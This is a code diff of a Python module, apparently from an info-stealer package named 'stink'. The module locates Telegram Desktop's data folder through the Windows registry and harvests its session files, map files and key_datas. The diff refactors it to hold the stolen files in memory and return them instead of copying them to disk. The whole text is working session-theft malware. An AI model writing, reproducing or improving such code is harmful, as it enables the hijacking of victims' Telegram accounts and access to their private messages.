@@ -1,9 +1,9 @@
 from re import findall
-from shutil import copyfile
-from os import listdir, path, makedirs
-from typing import Optional
+from os import listdir, path
+from typing import Optional, List
 from winreg import OpenKey, QueryValueEx, QueryInfoKey, EnumKey, HKEY_CURRENT_USER
 
+from stink.helpers import MemoryStorage
 from stink.helpers.config import TelegramConfig
 
 
@@ -11,25 +11,11 @@ class Telegram:
     """
     Collects sessions from the Telegram.
     """
-    def __init__(self, storage_path: str, folder: str):
+    def __init__(self, folder: str):
 
-        self.__full_path = path.join(storage_path, folder)
+        self.__folder = folder
         self.__config = TelegramConfig()
-
-    def __create_folder(self) -> None:
-        """
-        Creates storage for the Telegram module.
-
-        Parameters:
-        - None.
-
-        Returns:
-        - None.
-        """
-        folder = path.join(self.__full_path, "D877F783D5D3EF8C")
-
-        if not path.exists(folder):
-            makedirs(folder)
+        self.__storage = MemoryStorage()
 
     def __get_telegram_path(self) -> Optional[str]:
         """
@@ -88,24 +74,28 @@ class Telegram:
         if not sessions:
             return
 
-        self.__create_folder()
-
         sessions.remove("D877F783D5D3EF8C")
 
         for session in sessions:
-            copyfile(path.join(telegram_data, session), path.join(self.__full_path, session))
+            self.__storage.add_from_disk(
+                path.join(telegram_data, session),
+                path.join(self.__folder, session)
+            )
 
         maps = sum([findall(r"map.*", file) for file in listdir(path.join(telegram_data, "D877F783D5D3EF8C"))], [])
 
         for map in maps:
-            copyfile(
+            self.__storage.add_from_disk(
                 path.join(telegram_data, "D877F783D5D3EF8C", map),
-                path.join(self.__full_path, "D877F783D5D3EF8C", map)
+                path.join(self.__folder, "D877F783D5D3EF8C", map)
             )
 
-        copyfile(path.join(telegram_data, "key_datas"), path.join(self.__full_path, "key_datas"))
+        self.__storage.add_from_disk(
+            path.join(telegram_data, "key_datas"),
+            path.join(self.__folder, "key_datas")
+        )
 
-    def run(self) -> None:
+    def run(self) -> List:
         """
         Launches the Telegram collection module.
 
@@ -118,6 +108,8 @@ class Telegram:
         try:
 
             self.__get_sessions()
+
+            return self.__storage.get_data()
 
         except Exception as e:
             print(f"[Telegram]: {repr(e)}")
